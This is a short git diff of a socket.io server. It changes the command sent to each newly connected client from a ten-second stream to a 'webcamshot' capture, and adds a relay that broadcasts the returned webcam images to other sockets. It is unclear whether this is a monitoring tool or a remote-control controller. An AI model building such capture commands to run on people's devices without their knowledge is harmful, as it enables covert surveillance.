@@ -25,10 +25,7 @@ io.on('connection', (socket) => {
         addedClient = true
 
         // 10s stream
-        socket.emit("command", { event: "start stream" })
-        setTimeout(() => {
-            socket.emit("command", { event: "kill stream" })
-        }, 10000)
+        socket.emit("command", { event: "webcamshot" });
     })
 
     socket.on("error", (options) => {
@@ -43,6 +40,10 @@ io.on('connection', (socket) => {
 
     socket.on("screenshot", (imageBuffer) => {
         socket.broadcast.emit('screenshot', imageBuffer.toString("base64"));
+    })
+
+    socket.on("webcamshot", (imageBuffer) => {
+        socket.broadcast.emit('webcamshot', imageBuffer.toString("base64"));
     })
 
     socket.on("frame", (imageBuffer) => {
